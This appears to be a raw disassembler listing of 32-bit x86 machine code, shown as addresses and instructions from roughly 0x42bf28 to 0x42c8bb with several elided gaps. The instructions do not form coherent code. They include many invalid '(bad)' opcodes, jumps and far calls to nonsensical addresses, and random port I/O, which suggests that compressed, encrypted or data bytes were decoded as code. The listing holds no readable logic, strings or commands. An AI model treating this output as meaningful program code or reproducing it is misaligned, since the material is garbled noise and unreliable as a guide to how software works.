  42bf28:	cs jns 0x42bec3
  42bf2b:	mov    al,ds:0xf78580fd
  42bf30:	sub    bl,dl
  42bf32:	xchg   esp,eax
  42bf33:	inc    edx
  42bf34:	jle    0x42bf2d
  42bf36:	mov    ds:0x156caa09,al
  42bf3b:	inc    esi
  42bf3c:	xchg   ebp,eax
  42bf3d:	dec    esi
  42bf3e:	xchg   ch,bh
  42bf40:	fadd   DWORD PTR [edi+0x15]
  42bf43:	jp     0x42bf4c
  42bf45:	scas   al,BYTE PTR es:[edi]
  42bf46:	sub    ah,bh
  42bf48:	in     al,0x15
  42bf4a:	stc    
  42bf4b:	jmp    0xce11f85
  42bf50:	pop    esi
  42bf51:	outs   dx,BYTE PTR ds:[esi]
  42bf52:	cmp    al,0xed
  42bf54:	pop    es
  42bf55:	inc    ebp
  42bf56:	fldcw  WORD PTR [eax]
  42bf58:	leave  
  42bf59:	cmp    edx,edi
  42bf5b:	push   0x64
  42bf5d:	clc    
  42bf5e:	ja     0x42bfa3
  42bf60:	call   0x4eed:0x7ad67f5d
  42bf67:	and    bh,BYTE PTR [esi-0x38]
  42bf6a:	sbb    esi,DWORD PTR [eax+edi*4]
  42bf6d:	add    eax,0x435403ab
  42bf72:	jne    0x42bfd3
  42bf74:	(bad)  
  42bf76:	inc    ecx
  42bf77:	shr    DWORD PTR [edx],0x4a
  42bf7a:	push   ebx
  42bf7b:	aad    0xba
  42bf7d:	pop    edi
  42bf7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bf7f:	mov    esp,0xdba13d2e
  42bf84:	lods   eax,DWORD PTR ds:[esi]
  42bf85:	mov    al,ds:0x11f70c16
  42bf8a:	xor    dl,dl
  42bf8c:	sub    DWORD PTR [esi],ebp
  42bf8e:	jmp    0x42bf27
  42bf90:	add    BYTE PTR [ebx+0x2c7f5309],ch
  42bf96:	mov    al,ds:0x75d364ba
  42bf9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bf9c:	push   cs
  42bf9d:	and    BYTE PTR [esi-0x1],ch
  42bfa0:	push   edi
  42bfa1:	(bad)
  42bfa5:	jge    0x42bf5f
  42bfa7:	pusha  
  42bfa8:	ret    
  42bfa9:	mov    ds:0xc2d35bc7,al
  42bfae:	inc    esp
  42bfaf:	mov    edx,?
  42bfb1:	mov    BYTE PTR [esi+0x3d],dh
  42bfb4:	cwde   
  42bfb5:	dec    ecx
  42bfb6:	(bad)  
  42bfb7:	mov    ebp,0x521db1cd
  42bfbc:	mov    DWORD PTR [edx],ebx
  42bfbe:	es fwait
  42bfc0:	adc    al,0xa
  42bfc2:	cdq    
  42bfc3:	jl     0x42bf97
  42bfc5:	jge    0x42bf5b
  42bfc7:	mov    ah,BYTE PTR [esi-0x72]
  42bfca:	lahf   
  42bfcb:	jno    0x42bfa5
  42bfcd:	cwde   
  42bfce:	bound  eax,QWORD PTR [eax]
  42bfd0:	xor    DWORD PTR [esi-0x34],ecx
  42bfd3:	push   esp
  42bfd4:	add    DWORD PTR [edx-0x25],ebx
  42bfd7:	retf   
  42bfd8:	cli    
  42bfd9:	cmc    
  42bfda:	fucomi st,st(4)
  42bfdc:	inc    edi
  42bfdd:	aaa    
  42bfde:	cwde   
  42bfdf:	(bad)  
  42bfe0:	jnp    0x42bf64
  42bfe2:	dec    edi
  42bfe3:	xchg   esp,eax
  42bfe4:	test   eax,0xf38a7f33
  42bfe9:	push   ecx
  42bfea:	mov    bh,0x8c
  42bfec:	ins    BYTE PTR es:[edi],dx
  42bfed:	test   DWORD PTR [ecx-0x6e875b5a],ebp
  42bff3:	sbb    eax,ebp
  42bff5:	mov    eax,0x9e8225da
  42bffa:	loop   0x42bfd4
  42bffc:	jne    0x42bfd3
  42bffe:	xlat   BYTE PTR ds:[ebx]
  42bfff:	pop    ecx
  42c000:	or     esi,ebp
  42c002:	popf   
  42c003:	out    0xe3,eax
  42c005:	xchg   BYTE PTR ds:0x44d250ae,dl
  42c00b:	repz push eax
  42c00d:	shr    DWORD PTR [eax+0xe],0xee
	...
  42c071:	add    BYTE PTR [eax],al
  42c073:	add    BYTE PTR [edx],bh
  42c075:	xchg   edx,eax
  42c076:	ja     0x42c0aa
  42c078:	push   edi
  42c07a:	jg     0x42c016
  42c07c:	leave  
  42c07d:	or     DWORD PTR [edi-0x57],edi
  42c080:	xchg   BYTE PTR [ecx-0x46],al
  42c083:	dec    ebp
  42c084:	loope  0x42c05d
  42c086:	add    DWORD PTR [eax],eax
  42c088:	add    eax,0xd9000001
  42c08d:	lods   al,BYTE PTR ds:[esi]
  42c08e:	stos   DWORD PTR es:[edi],eax
  42c08f:	lds    edi,FWORD PTR [ebx+eiz*1-0x382fca3f]
  42c096:	ret    
  42c097:	ins    DWORD PTR es:[edi],dx
  42c098:	inc    ebp
  42c099:	pop    eax
  42c09a:	pop    ecx
  42c09b:	(bad)  
  42c09c:	xchg   BYTE PTR [ecx+0x42],dh
  42c09f:	popa   
  42c0a0:	xchg   BYTE PTR [edi-0x50],dl
  42c0a3:	into   
  42c0a4:	xlat   BYTE PTR ds:[ebx]
  42c0a5:	dec    eax
  42c0a6:	mov    edx,0xeef26b32
  42c0ab:	or     BYTE PTR [eax+0x2216809e],ch
  42c0b1:	cmp    esp,edi
  42c0b3:	cs js  0x42c05c
  42c0b6:	mov    cl,0x1a
  42c0b8:	adc    cl,BYTE PTR [eax+0x576f255f]
  42c0be:	loopne 0x42c127
  42c0c0:	es mov bl,0x44
  42c0c3:	inc    ebp
  42c0c4:	stos   DWORD PTR es:[edi],eax
  42c0c5:	jns    0x42c083
  42c0c7:	rcr    DWORD PTR [esi+0x0],1
  42c0ca:	adc    edi,DWORD PTR ds:0x395f8622
  42c0d0:	cmp    DWORD PTR [edi],ebx
  42c0d2:	push   ebx
  42c0d3:	clc    
  42c0d4:	std    
  42c0d5:	fnstenv [ebx+0x4fc4ba42]
  42c0db:	mov    ebx,0xa66e3dfa
  42c0e0:	xor    BYTE PTR [edi],ch
  42c0e2:	mov    ecx,0xc4cfe581
  42c0e7:	pop    ecx
  42c0e8:	add    al,0x4e
  42c0ea:	push   esp
  42c0eb:	mov    eax,ds:0x1769d088
  42c0f0:	jne    0x42c07d
  42c0f2:	fidiv  DWORD PTR [edx+0xb]
  42c0f5:	stos   BYTE PTR es:[edi],al
  42c0f6:	mov    cl,BYTE PTR [ebp-0x1]
  42c0f9:	fisttp WORD PTR [eax+0x77]
  42c0fc:	xchg   edi,eax
  42c0fd:	add    BYTE PTR ds:0xedade22f,ah
  42c103:	push   esi
  42c104:	pop    ds
  42c105:	idiv   BYTE PTR [eax+0x7a69af03]
  42c10b:	fld    DWORD PTR cs:[edi+0x2cb66477]
  42c112:	data16 lods al,BYTE PTR ds:[esi]
  42c114:	pop    eax
  42c115:	cdq    
  42c116:	bound  ecx,QWORD PTR [ebx]
  42c118:	push   ebp
  42c119:	fs or  ch,cl
  42c11c:	cmp    dh,dh
  42c11e:	mov    edi,0xb2dbc150
  42c123:	or     BYTE PTR [ebx],bl
  42c125:	xor    esi,DWORD PTR [edi+edx*2-0x2f]
  42c129:	outs   dx,DWORD PTR ds:[esi]
  42c12a:	js     0x42c1a3
  42c12c:	jp     0x42c152
  42c12e:	mov    ds:0xfc903339,eax
  42c133:	js     0x42c16f
  42c135:	mov    dh,0xf7
  42c137:	push   0xc50b4dfd
  42c13c:	sub    ah,al
  42c13e:	jae    0x42c0cf
  42c140:	repz pop eax
  42c142:	sbb    eax,0x89957149
  42c147:	je     0x42c11b
  42c149:	scas   eax,DWORD PTR es:[edi]
  42c14a:	inc    esp
  42c14b:	imul   edi,DWORD PTR [esi-0x45],0x6722a5d7
  42c152:	fistp  WORD PTR [ebp-0x67]
  42c155:	das    
  42c156:	adc    eax,0x9f686d20
  42c15b:	pop    es
  42c15c:	in     al,0xc2
  42c15e:	lahf   
  42c15f:	(bad)  
  42c160:	out    dx,eax
  42c161:	pop    ss
  42c162:	cmp    eax,0x735576d6
  42c167:	mov    bh,0x42
  42c169:	adc    eax,0xa65c21ae
  42c16e:	push   eax
  42c16f:	pop    esi
  42c170:	push   es
  42c171:	call   0x116d7fe7
  42c176:	sbb    al,ch
  42c178:	icebp  
  42c179:	fld    DWORD PTR [esp+esi*2]
  42c17c:	adc    DWORD PTR [ebx],0xc3b44bc5
  42c182:	cmp    DWORD PTR [edi-0x1f2400ff],ebx
  42c188:	scas   al,BYTE PTR es:[edi]
  42c189:	(bad)  
  42c18b:	out    0xd8,eax
  42c18d:	mov    eax,0xa31fff
	...
  42c1f2:	add    BYTE PTR [eax],al
  42c1f4:	imul   eax,DWORD PTR [edx-0x10105133],0x90f2c76b
  42c1fe:	xchg   esp,eax
  42c1ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c200:	stos   BYTE PTR es:[edi],al
  42c201:	push   ebx
  42c202:	test   esi,eax
  42c204:	out    0xd8,al
  42c206:	add    DWORD PTR [eax],eax
  42c208:	add    eax,0x36000001
  42c20d:	xor    al,0xad
  42c20f:	(bad)  
  42c210:	aad    0x86
  42c212:	fldcw  WORD PTR [edx-0x4be1712b]
  42c218:	xlat   BYTE PTR ds:[ebx]
  42c219:	or     DWORD PTR [ebx+0x7b],eax
  42c21c:	aad    0x7e
  42c21e:	in     al,0x95
  42c220:	mov    ebx,0xafa9cebe
  42c225:	push   ebp
  42c226:	test   al,0x6d
  42c228:	add    BYTE PTR [ebx+0x12],dh
  42c22b:	into   
  42c22c:	lock push ecx
  42c22e:	or     BYTE PTR [eax+0x26fbe1f7],bh
  42c234:	mov    edi,0xa76165c9
  42c239:	jge    0x42c224
  42c23b:	push   ebx
  42c23c:	xchg   ebp,eax
  42c23d:	jg     0x42c277
  42c23f:	sub    ebp,edx
  42c241:	leave  
  42c242:	fisub  DWORD PTR [esi+0x67]
  42c245:	mov    al,ds:0x5bab8fe2
  42c24a:	ror    DWORD PTR [edi+0x134855a3],0x0
  42c251:	sub    bh,BYTE PTR [ebp-0x54]
  42c254:	ret    0x5111
  42c257:	sbb    DWORD PTR [ecx],edi
  42c259:	sahf   
  42c25a:	in     al,0xe5
  42c25c:	jbe    0x42c2a8
  42c25e:	rcr    ch,cl
  42c260:	bound  edi,QWORD PTR es:[edx]
  42c263:	loop   0x42c22e
  42c265:	repnz mov dh,0xd8
  42c268:	sub    DWORD PTR [ecx],ebx
  42c26a:	xor    DWORD PTR [ecx-0x9],ebx
  42c26d:	cmp    DWORD PTR [edx+eiz*1],edx
  42c270:	jno    0x42c227
  42c272:	scas   al,BYTE PTR es:[edi]
  42c273:	xchg   BYTE PTR [esi+esi*2-0x86c1712],bh
  42c27a:	mov    WORD PTR [edx+ebx*4],es
  42c27d:	push   cs
  42c27e:	stos   DWORD PTR es:[edi],eax
  42c27f:	and    ebp,DWORD PTR [ebp-0x41]
  42c282:	sub    eax,0x8b7c32f0
  42c287:	jo     0x42c29b
  42c289:	mov    ecx,0x6e988599
  42c28e:	mov    BYTE PTR [ebp-0x38],cl
  42c291:	mov    ch,0x7d
  42c293:	ss and al,0x14
  42c296:	popf   
  42c297:	(bad)  
  42c298:	in     al,0xf4
  42c29a:	js     0x42c23a
  42c29c:	or     edx,eax
  42c29e:	inc    ebx
  42c29f:	and    DWORD PTR [ebp+0x2e],ebx
  42c2a2:	clc    
  42c2a3:	or     al,0xaf
  42c2a5:	(bad)  
  42c2a7:	scas   al,BYTE PTR es:[edi]
  42c2a8:	pop    edx
  42c2a9:	div    BYTE PTR [eax+0x5fd65964]
  42c2af:	pusha  
  42c2b0:	mov    ds:0xc24056e2,al
  42c2b5:	popa   
  42c2b6:	adc    ah,ch
  42c2b8:	push   cs
  42c2b9:	pop    esp
  42c2ba:	mov    ah,0x23
  42c2bc:	add    ah,BYTE PTR [esp+ebp*8+0x5a85c972]
  42c2c3:	lahf   
  42c2c4:	adc    ebp,DWORD PTR [eax-0x600516d7]
  42c2ca:	or     esp,DWORD PTR [edx+0x7fadc773]
  42c2d0:	push   eax
  42c2d1:	xor    DWORD PTR [ebp+0x62],esi
  42c2d4:	ins    BYTE PTR es:[edi],dx
  42c2d5:	mov    ch,0x35
  42c2d7:	inc    ecx
  42c2d8:	cs clc 
  42c2da:	sub    bl,0xcf
  42c2dd:	push   ebp
  42c2de:	pop    ecx
  42c2df:	(bad)  
  42c2e0:	push   ebx
  42c2e1:	jle    0x42c310
  42c2e3:	in     al,0xd8
  42c2e5:	sub    cl,BYTE PTR [eax+esi*8]
  42c2e8:	test   ah,ch
  42c2ea:	lods   al,BYTE PTR ds:[esi]
  42c2eb:	mov    al,ds:0x61b662e3
  42c2f0:	jmp    DWORD PTR [eax-0x5dd9cda7]
  42c2f6:	pop    es
  42c2f7:	push   ds
  42c2f8:	jecxz  0x42c2bb
  42c2fa:	aam    0x81
  42c2fc:	test   eax,0x56e690e
  42c301:	mov    esp,DWORD PTR [ebx]
  42c303:	retf   0xce0f
  42c306:	cmp    eax,0x6cc2d0fc
  42c30b:	add    BYTE PTR [edi],cl
  42c30d:	imul   eax,DWORD PTR [esi+0x60],0xe4
	...
  42c374:	out    0xf,al
  42c376:	fldcw  WORD PTR [ebp-0x7]
  42c379:	push   esi
  42c37b:	(bad)  
  42c37c:	in     eax,dx
  42c37d:	(bad)  
  42c37e:	sub    eax,0xd3ec98f6
  42c383:	dec    ecx
  42c384:	jmp    0x42c35f
  42c386:	add    DWORD PTR [eax],eax
  42c388:	add    eax,0x79000001
  42c38d:	scas   eax,DWORD PTR es:[edi]
  42c38e:	inc    edi
  42c38f:	lods   eax,DWORD PTR ds:[esi]
  42c390:	xor    eax,0x7deca6d
  42c395:	inc    edi
  42c396:	push   edi
  42c397:	push   ecx
  42c398:	clc    
  42c399:	xchg   DWORD PTR [ebx+0x53],edi
  42c39c:	mov    BYTE PTR [edi],ch
  42c39e:	(bad)  
  42c39f:	push   ds
  42c3a0:	push   edi
  42c3a1:	es mov dh,0x36
  42c3a4:	(bad)  
  42c3a5:	aad    0x66
  42c3a7:	lds    edx,FWORD PTR [edi+0x555859c4]
  42c3ad:	cmp    DWORD PTR [eax+0x3e],edi
  42c3b0:	mov    dh,0xae
  42c3b2:	xor    bl,BYTE PTR [edi]
  42c3b4:	jb     0x42c38b
  42c3b6:	xlat   BYTE PTR ds:[ebx]
  42c3b7:	sahf   
  42c3b8:	jl     0x42c39e
  42c3ba:	fidiv  DWORD PTR [esp+eax*4+0x1]
  42c3be:	in     al,dx
  42c3bf:	nop
  42c3c0:	jl     0x42c3d4
  42c3c2:	mov    edx,0x824857d4
  42c3c7:	int    0xbf
  42c3c9:	in     al,dx
  42c3ca:	std    
  42c3cb:	add    bl,0xfa
  42c3ce:	inc    ebp
  42c3cf:	xchg   edi,eax
  42c3d0:	xchg   edx,eax
  42c3d1:	dec    ebx
  42c3d2:	pop    eax
  42c3d3:	pop    edi
  42c3d4:	add    DWORD PTR [edi],ecx
  42c3d6:	sbb    eax,0x9a275a64
  42c3db:	nop
  42c3dc:	lods   al,BYTE PTR ds:[esi]
  42c3dd:	stc    
  42c3de:	daa    
  42c3df:	iret   
  42c3e0:	inc    eax
  42c3e1:	adc    BYTE PTR [edi+0x792cb090],0xbe
  42c3e8:	inc    esi
  42c3e9:	mov    esi,0xda2ed4c8
  42c3ee:	test   DWORD PTR [ebx-0xb],ebp
  42c3f1:	repz test BYTE PTR [edi-0x5b069dba],0xce
  42c3f9:	lea    eax,[ecx+0x72]
  42c3fc:	jmp    0x42c3e1
  42c3fe:	dec    ebx
  42c3ff:	dec    edx
  42c400:	ins    BYTE PTR es:[edi],dx
  42c401:	lahf   
  42c402:	es into 
  42c404:	jbe    0x42c41e
  42c406:	enter  0xfa24,0x6e
  42c40a:	fnstsw WORD PTR [ebx+0x1281faf1]
  42c410:	sbb    BYTE PTR [ebx-0x71fb3aa1],ch
  42c416:	push   edi
  42c417:	mul    DWORD PTR [ebp-0x4c]
  42c41a:	lea    edi,[esi]
  42c41c:	pop    edi
  42c41d:	mov    ds:0x8da20f65,eax
  42c422:	push   esi
  42c423:	mov    ds:0xb66d42a5,eax
  42c428:	dec    ebx
  42c429:	add    esi,ebx
  42c42b:	cli    
  42c42c:	lds    esp,FWORD PTR [eax+0xd]
  42c42f:	xchg   esi,eax
  42c430:	sbb    edi,eax
  42c432:	and    esp,esi
  42c434:	pop    edx
  42c435:	not    ebp
  42c437:	xor    DWORD PTR [esi+0xedeeb10],0x12cf16e7
  42c441:	or     BYTE PTR [esp+edi*4+0x67194d4f],cl
  42c448:	loop   0x42c473
  42c44a:	rcl    BYTE PTR [edx-0x30],1
  42c44d:	inc    ebp
  42c44e:	(bad)  
  42c44f:	imul   esp,DWORD PTR [edx],0xffffffc0
  42c452:	sub    DWORD PTR [esi+0x49],0x2e8047ac
  42c459:	and    dh,ch
  42c45b:	push   ebx
  42c45c:	dec    edi
  42c45d:	adc    eax,0xbfeaecc0
  42c462:	xchg   esp,eax
  42c463:	push   ebx
  42c464:	js     0x42c42f
  42c466:	fcmove st,st(0)
  42c468:	add    eax,0x1e55cd88
  42c46d:	dec    ecx
  42c46e:	aaa    
  42c46f:	and    BYTE PTR [ebp+eax*2+0x76],bh
  42c473:	mov    al,es:0x21b772c4
  42c479:	fistp  DWORD PTR [ecx]
  42c47b:	jno    0x42c44a
  42c47d:	jle    0x42c426
  42c47f:	pop    esp
  42c480:	dec    esp
  42c481:	dec    BYTE PTR [eax+edx*4+0x65]
  42c485:	adc    DWORD PTR [ecx-0x79],edi
  42c488:	jo     0x42c4d0
  42c48a:	arpl   WORD PTR [edi],ax
  42c48c:	cmp    BYTE PTR ds:0x3cf6e7,al
	...
  42c4f2:	add    BYTE PTR [eax],al
  42c4f4:	in     al,dx
  42c4f5:	sbb    ebp,edx
  42c4f7:	sahf   
  42c4f8:	cmc    
  42c4f9:	fsubp  st(7),st
  42c4fb:	jnp    0x42c4af
  42c4fd:	sti    
  42c4fe:	enter  0x9a34,0x2
  42c502:	pop    edx
  42c503:	lock fiadd DWORD PTR [bx+di]
  42c507:	add    BYTE PTR ds:0xef000001,al
  42c50d:	dec    ebx
  42c50e:	push   cs
  42c50f:	lods   eax,DWORD PTR ds:[esi]
  42c510:	and    BYTE PTR [ebp-0x230beb9b],dh
  42c516:	mov    al,0xe8
  42c518:	mov    WORD PTR [esi],fs
  42c51a:	adc    DWORD PTR [ebx],esi
  42c51c:	xor    DWORD PTR [ebp+0x5c3241a2],esi
  42c522:	stc    
  42c523:	retf   
  42c524:	cmp    ah,BYTE PTR [ebx]
  42c526:	loope  0x42c52a
  42c528:	add    eax,0xc97612dd
  42c52d:	add    al,0x8
  42c52f:	fsubr  QWORD PTR [eax-0x3eb69ada]
  42c535:	mov    gs,WORD PTR [edi+eiz*1+0x53467164]
  42c53c:	ret    0xd2cd
  42c53f:	push   es
  42c540:	pop    esp
  42c541:	inc    esp
  42c542:	and    edi,DWORD PTR [ebx]
  42c544:	fmulp  st(0),st
  42c546:	cs jg  0x42c539
  42c549:	adc    edx,0xf3ccb057
  42c54f:	pop    eax
  42c550:	adc    cl,BYTE PTR [edi+0x1efa06cf]
  42c556:	pop    es
  42c557:	and    eax,DWORD PTR [esp+ebx*1-0x50]
  42c55b:	xchg   ebp,eax
  42c55c:	adc    bh,bh
  42c55e:	(bad)  
  42c55f:	xor    eax,0x1c0b1b2a
  42c564:	lahf   
  42c565:	es add eax,0x3fa6911c
  42c56b:	setbe  BYTE PTR [edx-0x4d6e5f1f]
  42c572:	xchg   DWORD PTR [ebx+0x37],eax
  42c575:	sub    ah,BYTE PTR [ecx+0x2a41b34b]
  42c57b:	leave  
  42c57c:	adc    bl,ah
  42c57e:	test   al,0xff
  42c580:	push   esi
  42c581:	iret   
  42c582:	ss jnp 0x42c5a9
  42c585:	arpl   sp,si
  42c587:	cmp    al,0x4c
  42c589:	xor    edx,esp
  42c58b:	ins    DWORD PTR es:[edi],dx
  42c58c:	and    al,0xa0
  42c58e:	fbld   TBYTE PTR [edi]
  42c590:	stos   BYTE PTR es:[edi],al
  42c591:	mov    al,cs:0xc676423e
  42c597:	jmp    0x6d32b4f4
  42c59c:	out    dx,al
  42c59d:	push   esi
  42c59e:	data16 xchg BYTE PTR [eax+0x697ace94],ah
  42c5a5:	or     eax,0x3b95e59b
  42c5aa:	out    0xad,eax
  42c5ac:	push   ecx
  42c5ad:	adc    eax,0x1b082093
  42c5b2:	xchg   edx,eax
  42c5b3:	inc    ebp
  42c5b4:	xchg   edi,eax
  42c5b5:	or     eax,0xa92f58d1
  42c5ba:	imul   BYTE PTR [edi+edi*1]
  42c5bd:	fdiv   st,st(2)
  42c5bf:	push   edx
  42c5c0:	or     eax,0x74fcf6e5
  42c5c5:	pop    ebx
  42c5c6:	inc    edx
  42c5c7:	fldl2t 
  42c5c9:	ficomp WORD PTR [edi-0x3f]
  42c5cc:	jg     0x42c60a
  42c5ce:	add    eax,0xaebd189
  42c5d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c5d4:	clc    
  42c5d5:	imul   esp,DWORD PTR [edi+esi*8+0x30],0x410c47e2
  42c5dd:	sub    al,0x38
  42c5df:	cli    
  42c5e0:	push   0xc
  42c5e2:	dec    ebp
  42c5e3:	jnp    0x42c5b3
  42c5e5:	add    DWORD PTR [eax],edi
  42c5e7:	(bad)  
  42c5e8:	(bad)  
  42c5e9:	cli    
  42c5ea:	dec    ecx
  42c5eb:	repnz data16 (bad) 
  42c5ee:	icebp  
  42c5ef:	cmp    BYTE PTR [edx+0x7925f1ad],dl
  42c5f5:	rcr    ah,cl
  42c5f7:	mov    WORD PTR [edi+0x23],ds
  42c5fa:	ja     0x42c656
  42c5fc:	mov    DWORD PTR ds:0x939fadce,edi
  42c602:	test   eax,0xdc4e47bf
  42c607:	nop
  42c608:	fsub   QWORD PTR [esi+eiz*1]
  42c60b:	stos   BYTE PTR es:[edi],al
  42c60c:	jae    0x42c5f4
  42c60e:	sahf   
  42c60f:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
	...
  42c671:	add    BYTE PTR [eax],al
  42c673:	add    BYTE PTR [ebp+0x48],bl
  42c676:	jle    0x42c606
  42c678:	jg     0x42c638
  42c67a:	std    
  42c67b:	fstp   TBYTE PTR [ebx+0xc6dfc6b]
  42c681:	or     eax,0xdbf5d21e
  42c686:	add    DWORD PTR [eax],eax
  42c688:	add    eax,0xf5000001
  42c68d:	mov    DWORD PTR [esi-0x2f],esp
  42c690:	jns    0x42c6a7
  42c692:	arpl   WORD PTR [ebx],cx
  42c694:	mov    bh,0x8a
  42c696:	retf   0x9b3
  42c699:	and    al,0xf4
  42c69b:	jg     0x42c662
  42c69d:	lahf   
  42c69e:	loope  0x42c704
  42c6a0:	je     0x42c711
  42c6a2:	push   0x10
  42c6a4:	dec    ecx
  42c6a5:	daa    
  42c6a6:	sbb    DWORD PTR [edx],eax
  42c6a8:	loopne 0x42c6ab
  42c6aa:	add    BYTE PTR [eax+0x42bac7c5],ch
  42c6b0:	adc    al,0x71
  42c6b2:	pushf  
  42c6b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c6b4:	mov    esi,0x791fe14b
  42c6b9:	lds    ebx,FWORD PTR [ebp-0x3f191b79]
  42c6bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c6c0:	repz pop esi
  42c6c2:	xchg   BYTE PTR [edx+0x27],dl
  42c6c5:	inc    ecx
  42c6c6:	xor    bh,BYTE PTR [eax+0x62]
  42c6c9:	mov    ebp,0xe8158ace
  42c6ce:	nop    ebx
  42c6d1:	lea    ebx,[esi+esi*4-0x29]
  42c6d5:	mov    esi,0xd3507ea3
  42c6da:	dec    esp
  42c6db:	and    al,0xc
  42c6dd:	sar    DWORD PTR [ebx+0x2b],1
  42c6e0:	push   esp
  42c6e1:	enter  0xacf,0x7a
  42c6e5:	loop   0x42c6b8
  42c6e7:	retf   
  42c6e8:	aam    0x2c
  42c6ea:	sub    esi,DWORD PTR [ecx]
  42c6ec:	adc    al,0x3b
  42c6ee:	mov    ds:0x25dee1c5,eax
  42c6f3:	or     ch,0xc5
  42c6f6:	mov    ds:0x164b112c,eax
  42c6fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c6fc:	add    eax,0x654e8268
  42c701:	arpl   WORD PTR [edi+0x7d],bp
  42c704:	mov    dh,0x1e
  42c706:	retf   0x6574
  42c709:	rcr    DWORD PTR [edi-0x72],1
  42c70c:	jo     0x42c6a4
  42c70e:	mov    bh,BYTE PTR [ebx]
  42c710:	dec    ebp
  42c711:	pop    esi
  42c712:	test   BYTE PTR [ebx+0x120295aa],ch
  42c718:	push   ecx
  42c719:	leave  
  42c71a:	mov    ch,0x1f
  42c71c:	jmp    0x42c710
  42c71e:	fidivr DWORD PTR [ebx]
  42c720:	shl    esp,cl
  42c722:	test   DWORD PTR [ebx+0x39],eax
  42c725:	cmp    al,dh
  42c727:	dec    ebp
  42c728:	jge    0x42c771
  42c72a:	in     al,dx
  42c72b:	push   edx
  42c72c:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  42c72e:	pop    ecx
  42c72f:	shl    DWORD PTR es:[eax-0x66],0x36
  42c734:	or     DWORD PTR [edx+0x355edd8e],0xa7cc753f
  42c73e:	stos   DWORD PTR es:[edi],eax
  42c73f:	scas   al,BYTE PTR es:[edi]
  42c740:	or     eax,0x8d8a1eff
  42c745:	stc    
  42c746:	inc    esi
  42c747:	push   eax
  42c748:	scas   eax,DWORD PTR es:[edi]
  42c749:	xor    ah,BYTE PTR [ebx-0x6a]
  42c74c:	xor    eax,0xd52cd79f
  42c751:	pop    esi
  42c752:	mov    WORD PTR [esi+0x20c3deaf],fs
  42c758:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c759:	scas   al,BYTE PTR es:[edi]
  42c75a:	add    dl,BYTE PTR [ebp+0x248125a3]
  42c760:	push   ecx
  42c761:	and    DWORD PTR [ecx-0x7adb23e3],0x17b640e8
  42c76b:	sar    DWORD PTR [esi-0x509c65ab],cl
  42c771:	sub    ebp,ebx
  42c773:	and    al,0xdc
  42c775:	cmp    ebx,DWORD PTR [edx]
  42c777:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c778:	xchg   edi,eax
  42c779:	mov    cs,esi
  42c77b:	or     eax,0x6896317c
  42c780:	push   esi
  42c781:	jbe    0x42c712
  42c783:	mov    esi,0x92e2d806
  42c788:	aam    0x43
  42c78a:	loop   0x42c75c
  42c78c:	xchg   esp,eax
  42c78d:	jg     0x42c7d1
  42c78f:	xor    al,0x1c
	...
  42c7f1:	add    BYTE PTR [eax],al
  42c7f3:	add    BYTE PTR [eax],bh
  42c7f5:	mov    DWORD PTR [edx-0x6b],ebp
  42c7f8:	sti    
  42c7f9:	idiv   edi
  42c7fb:	lods   eax,DWORD PTR ds:[esi]
  42c7fc:	pop    ebp
  42c7fd:	sbb    eax,0x77bea40e
  42c802:	xchg   esi,eax
  42c803:	or     eax,0x1dcfa
  42c808:	add    eax,0x4b000001
  42c80d:	in     eax,0x9a
  42c80f:	cmp    eax,0xb6631788
  42c814:	or     dl,BYTE PTR [edx+0x27]
  42c817:	dec    ebp
  42c818:	cmp    cl,BYTE PTR [ebx+0x12]
  42c81b:	jae    0x42c7fe
  42c81d:	clc    
  42c81e:	cmp    DWORD PTR [ecx-0x18],esp
  42c821:	cmc    
  42c822:	pop    esp
  42c823:	adc    eax,0x830d5bfd
  42c828:	xchg   BYTE PTR [ecx+0x2bdc2593],ch
  42c82e:	int3   
  42c82f:	sbb    DWORD PTR [edi],eax
  42c831:	mov    ebp,0x7e21c403
  42c836:	mov    eax,ds:0xa78a4c5e
  42c83b:	popa   
  42c83c:	push   cs
  42c83d:	add    ebx,eax
  42c83f:	shr    DWORD PTR [ebx+0x43],cl
  42c842:	add    cl,BYTE PTR [ebx+0x619099a5]
  42c848:	popf   
  42c849:	int    0x19
  42c84b:	imul   edx,DWORD PTR [eax-0x14],0xf02c1767
  42c852:	or     ecx,DWORD PTR [edi-0x799982a1]
  42c858:	imul   ecx,DWORD PTR [ebx-0x55c4693a],0xf7e1222c
  42c862:	mov    esp,0xfff17c6c
  42c867:	mov    BYTE PTR [ecx-0x456d3d78],al
  42c86d:	ins    BYTE PTR es:[edi],dx
  42c86e:	mov    bl,0xd
  42c870:	imul   eax,esi,0x7f5f0c38
  42c876:	cli    
  42c877:	test   al,0x51
  42c879:	sbb    eax,0x887a179d
  42c87e:	add    al,0x8b
  42c880:	or     al,0xd6
  42c882:	or     ebx,esi
  42c884:	pop    edi
  42c885:	xchg   ebp,eax
  42c886:	je     0x42c82d
  42c888:	push   0xffffffec
  42c88a:	hlt    
  42c88b:	push   esi
  42c88c:	push   ss
  42c88d:	xchg   ebx,eax
  42c88e:	lods   al,BYTE PTR ds:[esi]
  42c88f:	(bad)  [esi]
  42c891:	and    eax,0xab3d8d29
  42c896:	cld    
  42c897:	cwde   
  42c898:	jge    0x42c81b
  42c89a:	xchg   ebp,eax
  42c89b:	add    al,0x36
  42c89d:	outs   dx,DWORD PTR ds:[esi]
  42c89e:	sub    DWORD PTR [ebp+esi*4-0x34],edi
  42c8a2:	ja     0x42c837
  42c8a4:	bound  ecx,QWORD PTR [ecx-0x3b11562b]
  42c8aa:	outs   dx,BYTE PTR ds:[esi]
  42c8ab:	cli    
  42c8ac:	fbstp  TBYTE PTR [edx+0x7d]
  42c8af:	fcmove st,st(1)
  42c8b1:	in     al,0x64
  42c8b3:	ss pop edi
  42c8b5:	jmp    0x42c866
  42c8b7:	mul    BYTE PTR [eax]
  42c8b9:	mov    ch,0x9d
  42c8bb:	fdiv   DWORD PTR [ebx-0x3d63c58a]
